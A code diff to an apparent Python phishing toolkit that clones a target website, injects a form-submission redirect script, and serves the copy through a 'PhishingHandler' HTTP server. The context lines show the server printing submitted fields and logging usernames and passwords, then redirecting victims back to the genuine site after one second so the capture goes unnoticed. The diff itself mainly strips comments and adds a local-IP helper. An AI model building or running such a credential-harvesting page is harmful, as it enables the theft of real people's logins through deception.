@@ -11,7 +11,6 @@ init(autoreset=True)
 
 def display_banner():
     banner = '''                                                           
-
 MM'""""'YMM dP                            MM"""""""`YM dP       oo          dP       
 M' .mmm. `M 88                            MM  mmmmm  M 88                   88       
 M  MMMMMooM 88 .d8888b. 88d888b. .d8888b. M'        .M 88d888b. dP .d8888b. 88d888b. 
@@ -67,7 +66,6 @@ def save_cloned_html(url, html_content, folder):
     '''
     soup.head.append(script_tag)
 
-    # Add script for redirection after form submission
     redirection_script = soup.new_tag('script')
     redirection_script.string = '''
     document.addEventListener('submit', function(e) {
@@ -88,7 +86,7 @@ def save_cloned_html(url, html_content, folder):
 
         setTimeout(function() {
             window.location.href = '%s';
-        }, 1000); // Redirect after 1 second
+        }, 1000);
     });
     ''' % url
 
@@ -99,6 +97,18 @@ def save_cloned_html(url, html_content, folder):
         f.write(soup.prettify())
     
     return cloned_html_path
+
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(0)
+    try:
+        s.connect(('8.8.8.8', 80))
+        local_ip = s.getsockname()[0]
+    except Exception:
+        local_ip = '127.0.0.1'
+    finally:
+        s.close()
+    return local_ip
 
 class PhishingHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -122,7 +132,6 @@ class PhishingHandler(BaseHTTPRequestHandler):
                 for value in values:
                     print(Fore.YELLOW + f"   {key}: {value}")
 
-            # Log credentials and other data
             username = parsed_data.get('username', [''])[0]
             password = parsed_data.get('password', [''])[0]
             if username or password:
@@ -162,7 +171,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
             self.wfile.write(b"System info received")
 
 def run_server(port=8080):
-    ip_address = socket.gethostbyname(socket.gethostname())
+    ip_address = get_local_ip()
     server_address = ('0.0.0.0', port)
     httpd = HTTPServer(server_address, PhishingHandler)
     
@@ -196,3 +205,4 @@ if __name__ == "__main__":
     args = parse_args()
     target_url = args.domain
     clone_and_host_website(target_url)
+
